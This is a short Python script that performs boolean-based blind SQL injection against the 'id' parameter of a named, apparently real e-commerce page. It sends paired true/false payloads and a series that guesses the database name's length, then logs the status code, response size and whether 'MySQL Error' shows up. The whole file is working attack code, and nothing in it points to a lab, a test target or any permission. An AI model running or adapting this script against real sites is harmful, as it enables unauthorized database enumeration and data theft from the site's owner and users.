#!/usr/bin/env python3
"""confirm boolean oracle: measure response diff between true/false conditions"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def size(payload):
    u = BASE + "?id=686" + payload
    code, body = fetch(u)
    return code, len(body), "MySQL Error" in body

# comparison pairs - use OR with subquery (should select different row or error)
tests = [
    ("%27%20OR%20(select%201)=1--%20", "OR-true"),
    ("%27%20OR%20(select%201)=2--%20", "OR-false"),
    ("%27%20OR%20(select%20length(database()))=1--%20", "OR-db-len1"),
    ("%27%20OR%20(select%20length(database()))=2--%20", "OR-db-len2"),
    ("%27%20OR%20(select%20length(database()))=3--%20", "OR-db-len3"),
    ("%27%20OR%20(select%20length(database()))=4--%20", "OR-db-len4"),
    ("%27%20OR%20(select%20length(database()))=5--%20", "OR-db-len5"),
    ("%27%20OR%20(select%20length(database()))=6--%20", "OR-db-len6"),
    ("%27%20OR%20(select%20length(database()))=7--%20", "OR-db-len7"),
    ("%27%20OR%20(select%20length(database()))=8--%20", "OR-db-len8"),
    ("%27%20OR%20(select%20length(database()))=9--%20", "OR-db-len9"),
    ("%27%20OR%20(select%20length(database()))=10--%20", "OR-db-len10"),
]
for payload, tag in tests:
    code, sz, err = size(payload)
    print("%-20s code=%s size=%d sqlerr=%s" % (tag, code, sz, err))
